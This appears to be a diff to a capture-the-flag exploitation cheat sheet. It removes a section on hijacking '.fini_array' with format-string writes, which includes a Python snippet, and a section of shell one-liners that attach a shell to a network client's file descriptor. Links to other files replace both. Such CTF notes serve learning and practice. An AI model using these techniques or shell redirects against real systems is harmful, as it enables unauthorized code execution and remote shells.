@@ -378,45 +378,6 @@ for (uint64_t ctr = 0; ; ctr++) {
 
 **Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.
 
-## .fini_array Hijack
+See [rop-and-shellcode.md](rop-and-shellcode.md) for `.fini_array` hijack details.
 
-**When to use:** Binary has writable `.fini_array` section and you have an arbitrary write primitive.
-
-**How it works:** When `main()` returns, `__libc_csu_fini` iterates `.fini_array` entries and calls each as a function pointer. Overwrite `.fini_array[0]` with target address (shellcode, win function, etc.).
-
-```python
-# Find .fini_array address
-fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
-# Or: objdump -h binary | grep fini_array
-
-# Overwrite with format string %hn (2-byte writes)
-writes = {
-    fini_array: target_addr & 0xFFFF,
-    fini_array + 2: (target_addr >> 16) & 0xFFFF,
-}
-```
-
-**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.
-
-## Shell Tricks
-
-**File descriptor redirection (no reverse shell needed):**
-```bash
-# Redirect stdin/stdout to client socket (fd 3 common for network)
-exec <&3; sh >&3 2>&3
-
-# Or as single command string
-exec<&3;sh>&3
-```
-- Network servers often have client connection on fd 3
-- Avoids firewall issues with outbound connections
-- Works when you have command exec but limited chars
-
-**Find correct fd:**
-```bash
-ls -la /proc/self/fd           # List open file descriptors
-```
-
-**Short shellcode alternatives:**
-- `sh<&3 >&3` - minimal shell redirect
-- Use `$0` instead of `sh` in some shells
+See [sandbox-escape.md](sandbox-escape.md) for shell tricks and restricted environment techniques.
